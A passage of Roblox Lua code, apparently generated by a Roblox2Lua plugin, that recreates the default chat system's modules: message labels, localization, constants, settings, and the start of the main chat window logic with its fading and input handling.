			local guiObjectSpacing = UDim2.new(0, 0, 0, 0)
		
			if channelName ~= messageData.OriginalChannel then
					local formatChannelName = string.format("{%s}", messageData.OriginalChannel)
					ChannelButton = util:AddChannelButtonToBaseMessage(BaseMessage, useChannelColor, formatChannelName, messageData.OriginalChannel)
					guiObjectSpacing = UDim2.new(0, ChannelButton.Size.X.Offset + util:GetStringTextBounds(" ", useFont, useTextSize).X, 0, 0)
					numNeededSpaces = numNeededSpaces + util:GetNumberOfSpaces(formatChannelName, useFont, useTextSize) + 1
			end
		
			local tagLabels = {}
			for i, tag in pairs(tags) do
				local tagColor = tag.TagColor or Color3.fromRGB(255, 0, 255)
				local tagText = tag.TagText or "???"
				local formatTagText = string.format("[%s] ", tagText)
				local label = util:AddTagLabelToBaseMessage(BaseMessage, tagColor, formatTagText)
				label.Position = guiObjectSpacing
		
				numNeededSpaces = numNeededSpaces + util:GetNumberOfSpaces(formatTagText, useFont, useTextSize)
				guiObjectSpacing = guiObjectSpacing + UDim2.new(0, label.Size.X.Offset, 0, 0)
		
				table.insert(tagLabels, label)
			end
		
			NameButton.Position = guiObjectSpacing
		
			local function UpdateTextFunction(messageObject)
				if messageData.IsFiltered then
					BaseMessage.Text = string.rep(" ", numNeededSpaces) .. messageObject.Message
				else
					local messageLength = messageObject.MessageLengthUtf8 or messageObject.MessageLength
					BaseMessage.Text = string.rep(" ", numNeededSpaces) .. string.rep("_", messageLength)
				end
			end
		
			UpdateTextFunction(messageData)
		
			local function GetHeightFunction(xSize)
				return util:GetMessageHeight(BaseMessage, BaseFrame, xSize)
			end
		
			local FadeParmaters = {}
			FadeParmaters[NameButton] = {
				TextTransparency = {FadedIn = 0, FadedOut = 1},
				TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
			}
		
			FadeParmaters[BaseMessage] = {
				TextTransparency = {FadedIn = 0, FadedOut = 1},
				TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
			}
		
			for i, tagLabel in pairs(tagLabels) do
				local index = string.format("Tag%d", i)
				FadeParmaters[tagLabel] = {
					TextTransparency = {FadedIn = 0, FadedOut = 1},
					TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
				}
			end
		
			if ChannelButton then
				FadeParmaters[ChannelButton] = {
					TextTransparency = {FadedIn = 0, FadedOut = 1},
					TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
				}
			end
		
			local FadeInFunction, FadeOutFunction, UpdateAnimFunction = util:CreateFadeFunctions(FadeParmaters)
		
			return {
				[util.KEY_BASE_FRAME] = BaseFrame,
				[util.KEY_BASE_MESSAGE] = BaseMessage,
				[util.KEY_UPDATE_TEXT_FUNC] = UpdateTextFunction,
				[util.KEY_GET_HEIGHT] = GetHeightFunction,
				[util.KEY_FADE_IN] = FadeInFunction,
				[util.KEY_FADE_OUT] = FadeOutFunction,
				[util.KEY_UPDATE_ANIMATION] = UpdateAnimFunction
			}
		end
		
		return {
			[util.KEY_MESSAGE_TYPE] = ChatConstants.MessageTypeDefault,
			[util.KEY_CREATOR_FUNCTION] = CreateMessageLabel
		}
		
	end[chat_localization] = function()
		--!nocheck
		
		local LocalizationService = game:GetService("LocalizationService")
		local ChatService = game:GetService("Chat")
		local success, userShouldLocalizeServerMessages = pcall(function() return UserSettings():IsUserFeatureEnabled("UserShouldLocalizeServerMessages") end)
		local userShouldLocalizeServerMessages = success and userShouldLocalizeServerMessages
		
		local existingKey = {
			["System"] = "InGame.Chat.Label.SystemMessagePrefix",
			["Team"] = "InGame.Chat.Label.TeamMessagePrefix",
			["From "] = "InGame.Chat.Label.From",
			["To "] = "InGame.Chat.Label.To",
		}
		local ChatLocalization = {
			_hasFetchedLocalization = false,
		}
		
		function ChatLocalization:_getTranslator()
			if not self._translator and not self._hasFetchedLocalization then
				-- Don't keep retrying if this fails.
				self._hasFetchedLocalization = true
				
				local localizationTable = ChatService:WaitForChild("ChatLocalization", 4)
				if localizationTable then
					self._translator = localizationTable:GetTranslator(LocalizationService.RobloxLocaleId)
					LocalizationService:GetPropertyChangedSignal("RobloxLocaleId"):Connect(function()
						-- If RobloxLocaleId changes invalidate the cached Translator.
						self._hasFetchedLocalization = false
						self._translator = nil
					end)
				else
					warn("Missing ChatLocalization. Chat interface will not be localized.")
				end
			end
			return self._translator
		end
		
		function ChatLocalization:Get(key, default, extraParameters)
			local rtv = default
			pcall(function()
				local translator = self:_getTranslator()
				if translator then
					rtv = translator:FormatByKey(key, extraParameters)
				else
					warn("Missing Translator. Used default for", key)
				end
			end)
			return rtv
		end
		
		function ChatLocalization:LocalizeFormattedMessage(message)
		
			if not userShouldLocalizeServerMessages then
				return message
			end
		
			local keyStart, keyEnd = string.find(message, "{RBX_LOCALIZATION_KEY}")
			if not keyStart then
				return message
			end
			local defaultStart, defaultEnd = string.find(message, "{RBX_LOCALIZATION_DEFAULT}")
			if not defaultStart then
				return message
			end
			local paramStart, paramEnd = string.find(message, "{RBX_LOCALIZATION_PARAMS}")
			local key = string.sub(message, keyEnd + 1, defaultStart - 1)
			local default
			if not paramStart then
				default = string.sub(message, defaultEnd + 1)
				return self:Get(key, default)
			end
			default = string.sub(message, defaultEnd + 1, paramStart - 1)
			local params = string.sub(message, paramEnd + 1)
			local extraParameters = {}
			for k,v in string.gmatch(params,"([^%s]+)=([^%s]+)") do
				extraParameters[k] = v
			end
		
			return self:Get(key, default, extraParameters)
		end
		
		function ChatLocalization:FormatMessageToSend(key, defaultMessage, parameterName, value)
			if userShouldLocalizeServerMessages then
				if parameterName and value then
					return "{RBX_LOCALIZATION_KEY}"..key.."{RBX_LOCALIZATION_DEFAULT}"..defaultMessage
						.."{RBX_LOCALIZATION_PARAMS}"..parameterName.."="..value
				else
					return "{RBX_LOCALIZATION_KEY}"..key.."{RBX_LOCALIZATION_DEFAULT}"..defaultMessage
				end
			else
				if parameterName and value then
					return string.gsub(self:Get(key,defaultMessage), "{"..parameterName.."}", value)
				else
					return self:Get(key,defaultMessage)
				end
			end
		end
		
		-- try localize whole/part of string
		-- no more-than-1 replacement for current existing keys.
		function ChatLocalization:tryLocalize(rawString)
			if existingKey[rawString] then
				return self:Get(existingKey[rawString], rawString)
			end
			for enString, localizationKey in pairs(existingKey) do
				if string.find(rawString, enString) then
					local localizedPart = self:Get(localizationKey, enString)
					return string.gsub(rawString, enString, localizedPart, 1)
				end
			end
			return rawString
		end
		
		return ChatLocalization
	end[chatconstants] = function()
		--	// FileName: ChatConstants.lua
		--	// Written by: TheGamer101
		--	// Description: Module for creating chat constants shared between server and client.
		
		local module = {}
		
		---[[ Message Types ]]
		module.MessageTypeDefault = "Message"
		module.MessageTypeSystem = "System"
		module.MessageTypeMeCommand = "MeCommand"
		module.MessageTypeWelcome = "Welcome"
		module.MessageTypeSetCore = "SetCore"
		module.MessageTypeWhisper = "Whisper"
		
		--[[ Version ]]
		module.MajorVersion = 0
		module.MinorVersion = 8
		module.BuildVersion = "2018.05.16"
		---[[ Command/Filter Priorities ]]
		module.VeryLowPriority = -5
		module.LowPriority = 0
		module.StandardPriority = 10
		module.HighPriority = 20
		module.VeryHighPriority = 25
		
		module.WhisperChannelPrefix = "To "
		
		return module
		
	end[chat_settings] = function()
		--	// FileName: ChatSettings.lua
		--	// Written by: Xsitsu
		--	// Description: Settings module for configuring different aspects of the chat window.
		
		local PlayersService = game:GetService("Players")
		local ChatService = game:GetService("Chat")
		
		local clientChatModules = script.Parent
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		
		local ChatDisplayNamesEnabledByDefault do
			local success, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserChatDisplayNamesEnabledByDefault")
			end)
			ChatDisplayNamesEnabledByDefault = success and value
		end
		
		local module = {}
		
		---[[ Chat Behaviour Settings ]]
		module.WindowDraggable = false
		module.WindowResizable = false
		module.ShowChannelsBar = false
		module.GamepadNavigationEnabled = false
		module.AllowMeCommand = false -- Me Command will only be effective when this set to true
		module.ShowUserOwnFilteredMessage = true	--Show a user the filtered version of their message rather than the original.
		-- Make the chat work when the top bar is off
		module.ChatOnWithTopBarOff = false
		module.ScreenGuiDisplayOrder = 6 -- The DisplayOrder value for the ScreenGui containing the chat.
		
		module.ShowFriendJoinNotification = true -- Show a notification in the chat when a players friend joins the game.
		
		--- Replace with true/false to force the chat type. Otherwise this will default to the setting on the website.
		module.BubbleChatEnabled = PlayersService.BubbleChat
		module.ClassicChatEnabled = PlayersService.ClassicChat
		
		---[[ Chat Text Size Settings ]]
		module.ChatWindowTextSize = 18
		module.ChatChannelsTabTextSize = 18
		module.ChatBarTextSize = 18
		module.ChatWindowTextSizePhone = 14
		module.ChatChannelsTabTextSizePhone = 18
		module.ChatBarTextSizePhone = 14
		
		---[[ Font Settings ]]
		module.DefaultFont = Enum.Font.SourceSansBold
		module.ChatBarFont = Enum.Font.SourceSansBold
		
		----[[ Color Settings ]]
		module.BackGroundColor = Color3.new(0, 0, 0)
		module.DefaultMessageColor = Color3.new(1, 1, 1)
		module.DefaultNameColor = Color3.new(1, 1, 1)
		module.ChatBarBackGroundColor = Color3.new(0, 0, 0)
		module.ChatBarBoxColor = Color3.new(1, 1, 1)
		module.ChatBarTextColor = Color3.new(0, 0, 0)
		module.ChannelsTabUnselectedColor = Color3.new(0, 0, 0)
		module.ChannelsTabSelectedColor = Color3.new(30/255, 30/255, 30/255)
		module.DefaultChannelNameColor = Color3.fromRGB(35, 76, 142)
		module.WhisperChannelNameColor = Color3.fromRGB(102, 14, 102)
		module.ErrorMessageTextColor = Color3.fromRGB(245, 50, 50)
		
		---[[ Window Settings ]]
		module.MinimumWindowSize = UDim2.new(0.3, 0, 0.25, 0)
		module.MaximumWindowSize = UDim2.new(1, 0, 1, 0) -- if you change this to be greater than full screen size, weird things start to happen with size/position bounds checking.
		module.DefaultWindowPosition = UDim2.new(0, 0, 0, 0)
		local extraOffset = (7 * 2) + (5 * 2) -- Extra chatbar vertical offset
		module.DefaultWindowSizePhone = UDim2.new(0.5, 0, 0.5, extraOffset)
		module.DefaultWindowSizeTablet = UDim2.new(0.4, 0, 0.3, extraOffset)
		module.DefaultWindowSizeDesktop = UDim2.new(0.3, 0, 0.25, extraOffset)
		
		---[[ Fade Out and In Settings ]]
		module.ChatWindowBackgroundFadeOutTime = 3.5 --Chat background will fade out after this many seconds.
		module.ChatWindowTextFadeOutTime = 30				--Chat text will fade out after this many seconds.
		module.ChatDefaultFadeDuration = 0.8
		module.ChatShouldFadeInFromNewInformation = false
		module.ChatAnimationFPS = 20.0
		
		---[[ Channel Settings ]]
		module.GeneralChannelName = "All" -- You can set to nil to turn off echoing to a general channel.
		module.EchoMessagesInGeneralChannel = true -- Should messages to channels other than general be echoed into the general channel.
		-- 																						Setting this to false should be used with ShowChannelsBar
		module.ChannelsBarFullTabSize = 4 -- number of tabs in bar before it starts to scroll
		module.MaxChannelNameLength = 12
		-- To make sure whispering behavior remains consistent, this is currently set at 50 characters
		module.MaxChannelNameCheckLength = 50
		--// Although this feature is pretty much ready, it needs some UI design still.
		module.RightClickToLeaveChannelEnabled = false
		module.MessageHistoryLengthPerChannel = 50
		-- Show the help text for joining and leaving channels. This is not useful unless custom channels have been added.
		-- So it is turned off by default.
		module.ShowJoinAndLeaveHelpText = false
		
		---[[ Message Settings ]]
		module.MaximumMessageLength = 200
		module.DisallowedWhiteSpace = {"\n", "\r", "\t", "\v", "\f"}
		module.ClickOnPlayerNameToWhisper = true
		module.ClickOnChannelNameToSetMainChannel = true
		module.BubbleChatMessageTypes = {ChatConstants.MessageTypeDefault, ChatConstants.MessageTypeWhisper}
		
		---[[ Misc Settings ]]
		module.WhisperCommandAutoCompletePlayerNames = true
		
		--[[ Display Names ]]
		--Uses DisplayNames instead of UserNames in chat messages
		module.PlayerDisplayNamesEnabled = ChatDisplayNamesEnabledByDefault
		--Allows users to do /w displayName along with /w userName, only works if PlayerDisplayNamesEnabled is 'true'
		module.WhisperByDisplayName = ChatDisplayNamesEnabledByDefault
		
		local ChangedEvent = Instance.new("BindableEvent")
		
		local proxyTable = setmetatable({},
		{
			__index = function(tbl, index)
				return module[index]
			end,
			__newindex = function(tbl, index, value)
				module[index] = value
				ChangedEvent:Fire(index, value)
			end,
		})
		
		rawset(proxyTable, "SettingsChanged", ChangedEvent.Event)
		
		return proxyTable
		
	end
}

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local tcrgwfwefc = Instance.new("LocalScript")
tcrgwfwefc.Disabled = true
tcrgwfwefc.Name = "tcrgwfwefc"
tcrgwfwefc.Parent = workspace

local chat_main = Instance.new("ModuleScript")
chat_main.Name = "ChatMain"
chat_main.Parent = tcrgwfwefc

local curve_util = Instance.new("ModuleScript")
curve_util.Name = "CurveUtil"
curve_util.Parent = chat_main

local message_sender = Instance.new("ModuleScript")
message_sender.Name = "MessageSender"
message_sender.Parent = chat_main

local object_pool = Instance.new("ModuleScript")
object_pool.Name = "ObjectPool"
object_pool.Parent = chat_main

local channels_tab = Instance.new("ModuleScript")
channels_tab.Name = "ChannelsTab"
channels_tab.Parent = chat_main

local command_processor = Instance.new("ModuleScript")
command_processor.Name = "CommandProcessor"
command_processor.Parent = chat_main

local message_label_creator = Instance.new("ModuleScript")
message_label_creator.Name = "MessageLabelCreator"
message_label_creator.Parent = chat_main

local chat_window = Instance.new("ModuleScript")
chat_window.Name = "ChatWindow"
chat_window.Parent = chat_main

local message_log_display = Instance.new("ModuleScript")
message_log_display.Name = "MessageLogDisplay"
message_log_display.Parent = chat_main

local chatchannel = Instance.new("ModuleScript")
chatchannel.Name = "ChatChannel"
chatchannel.Parent = chat_main

local chat_bar = Instance.new("ModuleScript")
chat_bar.Name = "ChatBar"
chat_bar.Parent = chat_main

local channels_bar = Instance.new("ModuleScript")
channels_bar.Name = "ChannelsBar"
channels_bar.Parent = chat_main

--// Modules

local modules = {
	[chat_main] = function()
		--!nocheck
		
		--	// FileName: ChatMain.lua
		--	// Written by: Xsitsu
		--	// Description: Main module to handle initializing chat window UI and hooking up events to individual UI pieces.
		
		local moduleApiTable = {}
		
		--// This section of code waits until all of the necessary RemoteEvents are found in EventFolder.
		--// I have to do some weird stuff since people could potentially already have pre-existing
		--// things in a folder with the same name, and they may have different class types.
		--// I do the useEvents thing and set EventFolder to useEvents so I can have a pseudo folder that
		--// the rest of the code can interface with and have the guarantee that the RemoteEvents they want
		--// exist with their desired names.
		
		local FFlagFixChatWindowHoverOver = false do
			local ok, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserFixChatWindowHoverOver")
			end)
			if ok then
				FFlagFixChatWindowHoverOver = value
			end
		end
		
		local FFlagFixMouseCapture = false do
			local ok, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserFixMouseCapture")
			end)
			if ok then
				FFlagFixMouseCapture = value
			end
		end
		
		local FFlagUserHandleChatHotKeyWithContextActionService = false do
			local ok, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserHandleChatHotKeyWithContextActionService")
			end)
			if ok then
				FFlagUserHandleChatHotKeyWithContextActionService = value
			end
		end
		
		local FILTER_MESSAGE_TIMEOUT = 60
		
		local RunService = game:GetService("RunService")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local Chat = game:GetService("Chat")
		local StarterGui = game:GetService("StarterGui")
		local ContextActionService = game:GetService("ContextActionService")
		
		local DefaultChatSystemChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
		local EventFolder = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local messageCreatorModules = clientChatModules:WaitForChild("MessageCreatorModules")
		local MessageCreatorUtil = require(messageCreatorModules:WaitForChild("Util"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} function ChatLocalization:Get(key,default) return default end end
		
		local numChildrenRemaining = 10 -- #waitChildren returns 0 because it's a dictionary
		local waitChildren =
		{
			OnNewMessage = "RemoteEvent",
			OnMessageDoneFiltering = "RemoteEvent",
			OnNewSystemMessage = "RemoteEvent",
			OnChannelJoined = "RemoteEvent",
			OnChannelLeft = "RemoteEvent",
			OnMuted = "RemoteEvent",
			OnUnmuted = "RemoteEvent",
			OnMainChannelSet = "RemoteEvent",
		
			SayMessageRequest = "RemoteEvent",
			GetInitDataRequest = "RemoteFunction",
		}
		-- waitChildren/EventFolder does not contain all the remote events, because the server version could be older than the client version.
		-- In that case it would not create the new events.
		-- These events are accessed directly from DefaultChatSystemChatEvents
		
		local useEvents = {}
		
		local FoundAllEventsEvent = Instance.new("BindableEvent")
		
		function TryRemoveChildWithVerifyingIsCorrectType(child)
			if (waitChildren[child.Name] and child:IsA(waitChildren[child.Name])) then
				waitChildren[child.Name] = nil
				useEvents[child.Name] = child
				numChildrenRemaining = numChildrenRemaining - 1
			end
		end
		
		for i, child in pairs(EventFolder:GetChildren()) do
			TryRemoveChildWithVerifyingIsCorrectType(child)
		end
		
		if (numChildrenRemaining > 0) then
			local con = EventFolder.ChildAdded:connect(function(child)
				TryRemoveChildWithVerifyingIsCorrectType(child)
				if (numChildrenRemaining < 1) then
					FoundAllEventsEvent:Fire()
				end
			end)
		
			FoundAllEventsEvent.Event:wait()
			con:disconnect()
		
			FoundAllEventsEvent:Destroy()
		end
		
		EventFolder = useEvents
		
		
		
		--// Rest of code after waiting for correct events.
		
		local UserInputService = game:GetService("UserInputService")
		local RunService = game:GetService("RunService")
		
		local Players = game:GetService("Players")
		local LocalPlayer = Players.LocalPlayer
		
		while not LocalPlayer do
			Players.ChildAdded:wait()
			LocalPlayer = Players.LocalPlayer
		end
		
		local canChat = true
		
		local ChatDisplayOrder = 6
		if ChatSettings.ScreenGuiDisplayOrder ~= nil then
			ChatDisplayOrder = ChatSettings.ScreenGuiDisplayOrder
		end
		
		local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
		local GuiParent = Instance.new("ScreenGui")
		GuiParent.Name = "Chat"
		GuiParent.ResetOnSpawn = false
		GuiParent.DisplayOrder = ChatDisplayOrder
		GuiParent.Parent = PlayerGui
		
		local DidFirstChannelsLoads = false
		
		local modulesFolder = script
		
		local moduleChatWindow = require(modulesFolder:WaitForChild("ChatWindow"))
		local moduleChatBar = require(modulesFolder:WaitForChild("ChatBar"))
		local moduleChannelsBar = require(modulesFolder:WaitForChild("ChannelsBar"))
		local moduleMessageLabelCreator = require(modulesFolder:WaitForChild("MessageLabelCreator"))
		local moduleMessageLogDisplay = require(modulesFolder:WaitForChild("MessageLogDisplay"))
		local moduleChatChannel = require(modulesFolder:WaitForChild("ChatChannel"))
		local moduleCommandProcessor = require(modulesFolder:WaitForChild("CommandProcessor"))
		
		local ChatWindow = moduleChatWindow.new()
		local ChannelsBar = moduleChannelsBar.new()
		local MessageLogDisplay = moduleMessageLogDisplay.new()
		local CommandProcessor = moduleCommandProcessor.new()
		local ChatBar = moduleChatBar.new(CommandProcessor, ChatWindow)
		
		ChatWindow:CreateGuiObjects(GuiParent)
		
		ChatWindow:RegisterChatBar(ChatBar)
		ChatWindow:RegisterChannelsBar(ChannelsBar)
		ChatWindow:RegisterMessageLogDisplay(MessageLogDisplay)
		
		MessageCreatorUtil:RegisterChatWindow(ChatWindow)
		
		local MessageSender = require(modulesFolder:WaitForChild("MessageSender"))
		MessageSender:RegisterSayMessageFunction(EventFolder.SayMessageRequest)
		
		
		
		if (UserInputService.TouchEnabled) then
			ChatBar:SetTextLabelText(ChatLocalization:Get("GameChat_ChatMain_ChatBarTextTouch",'Tap here to chat'))
		else
			ChatBar:SetTextLabelText(ChatLocalization:Get("GameChat_ChatMain_ChatBarText",'To chat click here or press "/" key'))
		end
		
		spawn(function()
			local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
			local animationFps = ChatSettings.ChatAnimationFPS or 20.0
		
			local updateWaitTime = 1.0 / animationFps
			local lastTick = tick()
			while true do
				local currentTick = tick()
				local tickDelta = currentTick - lastTick
				local dtScale = CurveUtil:DeltaTimeToTimescale(tickDelta)
		
				if dtScale ~= 0 then
					ChatWindow:Update(dtScale)
				end
		
				lastTick = currentTick
				wait(updateWaitTime)
			end
		end)
		
		
		
		
		--////////////////////////////////////////////////////////////////////////////////////////////
		--////////////////////////////////////////////////////////////// Code to do chat window fading
		--////////////////////////////////////////////////////////////////////////////////////////////
		function CheckIfPointIsInSquare(checkPos, topLeft, bottomRight)
			return (topLeft.X <= checkPos.X and checkPos.X <= bottomRight.X and
				topLeft.Y <= checkPos.Y and checkPos.Y <= bottomRight.Y)
		end
		
		local backgroundIsFaded = false
		local textIsFaded = false
		local lastTextFadeTime = 0
		local lastBackgroundFadeTime = 0
		
		local fadedChanged = Instance.new("BindableEvent")
		local mouseStateChanged = Instance.new("BindableEvent")
		local chatBarFocusChanged = Instance.new("BindableEvent")
		
		function DoBackgroundFadeIn(setFadingTime)
			lastBackgroundFadeTime = tick()
			backgroundIsFaded = false
			fadedChanged:Fire()
			ChatWindow:FadeInBackground((setFadingTime or ChatSettings.ChatDefaultFadeDuration))
		
			local currentChannelObject = ChatWindow:GetCurrentChannel()
			if (currentChannelObject) then
		
				local Scroller = MessageLogDisplay.Scroller
				Scroller.ScrollingEnabled = true
				Scroller.ScrollBarThickness = moduleMessageLogDisplay.ScrollBarThickness
			end
		end
		
		function DoBackgroundFadeOut(setFadingTime)
			lastBackgroundFadeTime = tick()
			backgroundIsFaded = true
			fadedChanged:Fire()
			ChatWindow:FadeOutBackground((setFadingTime or ChatSettings.ChatDefaultFadeDuration))
		
			local currentChannelObject = ChatWindow:GetCurrentChannel()
			if (currentChannelObject) then
		
				local Scroller = MessageLogDisplay.Scroller
				Scroller.ScrollingEnabled = false
				Scroller.ScrollBarThickness = 0
			end
		end
		
		function DoTextFadeIn(setFadingTime)
			lastTextFadeTime = tick()
			textIsFaded = false
			fadedChanged:Fire()
			ChatWindow:FadeInText((setFadingTime or ChatSettings.ChatDefaultFadeDuration) * 0)
		end
		
		function DoTextFadeOut(setFadingTime)
			lastTextFadeTime = tick()
			textIsFaded = true
			fadedChanged:Fire()
			ChatWindow:FadeOutText((setFadingTime or ChatSettings.ChatDefaultFadeDuration))
		end
		
		function DoFadeInFromNewInformation()
			DoTextFadeIn()
			if ChatSettings.ChatShouldFadeInFromNewInformation then
				DoBackgroundFadeIn()
			end
		end
		
		function InstantFadeIn()
			DoBackgroundFadeIn(0)
			DoTextFadeIn(0)
		end
		
		function InstantFadeOut()
			DoBackgroundFadeOut(0)
			DoTextFadeOut(0)
		end
		
		local mouseIsInWindow = nil
		function UpdateFadingForMouseState(mouseState)
			mouseIsInWindow = mouseState
		
			mouseStateChanged:Fire()
		
			if (ChatBar:IsFocused()) then return end
		
			if (mouseState) then
				DoBackgroundFadeIn()
				DoTextFadeIn()
			else
				DoBackgroundFadeIn()
			end
		end
		
		
		spawn(function()
			while true do
				RunService.RenderStepped:wait()
		
				while (mouseIsInWindow or ChatBar:IsFocused()) do
					if (mouseIsInWindow) then
						mouseStateChanged.Event:wait()
					end
					if (ChatBar:IsFocused()) then
						chatBarFocusChanged.Event:wait()
					end
				end
		
				if (not backgroundIsFaded) then
					local timeDiff = tick() - lastBackgroundFadeTime
					if (timeDiff > ChatSettings.ChatWindowBackgroundFadeOutTime) then
						DoBackgroundFadeOut()
					end
		
				elseif (not textIsFaded) then
					local timeDiff = tick() - lastTextFadeTime
					if (timeDiff > ChatSettings.ChatWindowTextFadeOutTime) then
						DoTextFadeOut()
					end
		
				else
					fadedChanged.Event:wait()
		
				end
		
			end
		end)
		
		function getClassicChatEnabled()
			if ChatSettings.ClassicChatEnabled ~= nil then
				return ChatSettings.ClassicChatEnabled
			end
			return Players.ClassicChat
		end
		
		function getBubbleChatEnabled()
			if ChatSettings.BubbleChatEnabled ~= nil then
				return ChatSettings.BubbleChatEnabled
			end
			return Players.BubbleChat
		end
		
		function bubbleChatOnly()
		 	return not getClassicChatEnabled() and getBubbleChatEnabled()
		end
		
		function UpdateMousePosition(mousePos, ignoreForFadeIn)
			if not (moduleApiTable.Visible and moduleApiTable.IsCoreGuiEnabled and (moduleApiTable.TopbarEnabled or ChatSettings.ChatOnWithTopBarOff)) then return end
		
			if bubbleChatOnly() then
				return
			end
		
			local windowPos = ChatWindow.GuiObject.AbsolutePosition
			local windowSize = ChatWindow.GuiObject.AbsoluteSize
		
			local newMouseState = CheckIfPointIsInSquare(mousePos, windowPos, windowPos + windowSize)
		
			if FFlagFixChatWindowHoverOver then
				if ignoreForFadeIn and newMouseState == true then
					return
				end
			end
		
			if (newMouseState ~= mouseIsInWindow) then
				UpdateFadingForMouseState(newMouseState)
			end
		end
		
		UserInputService.InputChanged:connect(function(inputObject, gameProcessedEvent)
			if (inputObject.UserInputType == Enum.UserInputType.MouseMovement) then
				local mousePos = Vector2.new(inputObject.Position.X, inputObject.Position.Y)
				UpdateMousePosition(mousePos, --[[ ignoreForFadeIn = ]] gameProcessedEvent)
			end
		end)
		
		UserInputService.TouchTap:connect(function(tapPos, gameProcessedEvent)
			UpdateMousePosition(tapPos[1], --[[ ignoreForFadeIn = ]] false)
		end)
		
		UserInputService.TouchMoved:connect(function(inputObject, gameProcessedEvent)
			local tapPos = Vector2.new(inputObject.Position.X, inputObject.Position.Y)
			UpdateMousePosition(tapPos, --[[ ignoreForFadeIn = ]] false)
		end)
		
		if not FFlagFixMouseCapture then
			UserInputService.Changed:connect(function(prop)
				if prop == "MouseBehavior" then
					if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
						local windowPos = ChatWindow.GuiObject.AbsolutePosition
						local windowSize = ChatWindow.GuiObject.AbsoluteSize
						local screenSize = GuiParent.AbsoluteSize
		
						local centerScreenIsInWindow = CheckIfPointIsInSquare(screenSize/2, windowPos, windowPos + windowSize)
						if centerScreenIsInWindow then
							UserInputService.MouseBehavior = Enum.MouseBehavior.Default
						end
					end
				end
			end)
		end
		
		--// Start and stop fading sequences / timers
		UpdateFadingForMouseState(true)
		UpdateFadingForMouseState(false)
		
		
		--////////////////////////////////////////////////////////////////////////////////////////////
		--///////////// Code to talk to topbar and maintain set/get core backwards compatibility stuff
		--////////////////////////////////////////////////////////////////////////////////////////////
		local Util = {}
		do
			function Util.Signal()
				local sig = {}
		
				local mSignaler = Instance.new('BindableEvent')
		
				local mArgData = nil
				local mArgDataCount = nil
		
				function sig:fire(...)
					mArgData = {...}
					mArgDataCount = select('#', ...)
					mSignaler:Fire()
				end
		
				function sig:connect(f)
					if not f then error("connect(nil)", 2) end
					return mSignaler.Event:connect(function()
						f(unpack(mArgData, 1, mArgDataCount))
					end)
				end
		
				function sig:wait()
					mSignaler.Event:wait()
					assert(mArgData, "Missing arg data, likely due to :TweenSize/Position corrupting threadrefs.")
					return unpack(mArgData, 1, mArgDataCount)
				end
		
				return sig
			end
		end
		
		
		function SetVisibility(val)
			ChatWindow:SetVisible(val)
			moduleApiTable.VisibilityStateChanged:fire(val)
			moduleApiTable.Visible = val
		
			if (moduleApiTable.IsCoreGuiEnabled) then
				if (val) then
					InstantFadeIn()
				else
					InstantFadeOut()
				end
			end
		end
		
		do
			moduleApiTable.TopbarEnabled = true
			moduleApiTable.MessageCount = 0
			moduleApiTable.Visible = true
			moduleApiTable.IsCoreGuiEnabled = true
		
			function moduleApiTable:ToggleVisibility()
				SetVisibility(not ChatWindow:GetVisible())
			end
		
			function moduleApiTable:SetVisible(visible)
				if (ChatWindow:GetVisible() ~= visible) then
					SetVisibility(visible)
				end
			end
		
			function moduleApiTable:FocusChatBar()
				ChatBar:CaptureFocus()
			end
		
			function moduleApiTable:EnterWhisperState(player)
				ChatBar:EnterWhisperState(player)
			end
		
			function moduleApiTable:GetVisibility()
				return ChatWindow:GetVisible()
			end
		
			function moduleApiTable:GetMessageCount()
				return self.MessageCount
			end
		
			function moduleApiTable:TopbarEnabledChanged(enabled)
				self.TopbarEnabled = enabled
				self.CoreGuiEnabled:fire(game:GetService("StarterGui"):GetCoreGuiEnabled(Enum.CoreGuiType.Chat))
			end
		
			function moduleApiTable:IsFocused(useWasFocused)
				return ChatBar:IsFocused()
			end
		
			moduleApiTable.ChatBarFocusChanged = Util.Signal()
			moduleApiTable.VisibilityStateChanged = Util.Signal()
			moduleApiTable.MessagesChanged = Util.Signal()
		
		
			moduleApiTable.MessagePosted = Util.Signal()
			moduleApiTable.CoreGuiEnabled = Util.Signal()
		
			moduleApiTable.ChatMakeSystemMessageEvent = Util.Signal()
			moduleApiTable.ChatWindowPositionEvent = Util.Signal()
			moduleApiTable.ChatWindowSizeEvent = Util.Signal()
			moduleApiTable.ChatBarDisabledEvent = Util.Signal()
		
		
			function moduleApiTable:fChatWindowPosition()
				return ChatWindow.GuiObject.Position
			end
		
			function moduleApiTable:fChatWindowSize()
				return ChatWindow.GuiObject.Size
			end
		
			function moduleApiTable:fChatBarDisabled()
				return not ChatBar:GetEnabled()
			end
		
		    if FFlagUserHandleChatHotKeyWithContextActionService then
		        local TOGGLE_CHAT_ACTION_NAME = "ToggleChat"
		
		        -- Callback when chat hotkey is pressed
		        local function handleAction(actionName, inputState, inputObject)
		            if actionName == TOGGLE_CHAT_ACTION_NAME and inputState == Enum.UserInputState.Begin and canChat and inputObject.UserInputType == Enum.UserInputType.Keyboard then
		                DoChatBarFocus()
		            end
		        end
		        ContextActionService:BindAction(TOGGLE_CHAT_ACTION_NAME, handleAction, true, Enum.KeyCode.Slash)
		    else
